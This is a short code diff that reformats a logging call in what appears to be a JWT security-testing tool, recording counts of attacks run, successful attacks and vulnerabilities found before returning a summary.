-                         vulnerabilities_found=len(summary.vulnerabilities_found))
+        self.logger.info(
+            "JWT attack execution completed",
+            total_attacks=self.session.total_attacks,
+            successful_attacks=self.session.successful_attacks,
+            vulnerabilities_found=len(summary.vulnerabilities_found),
+        )
         return summary
 
     def _initialize_session(self) -> None:
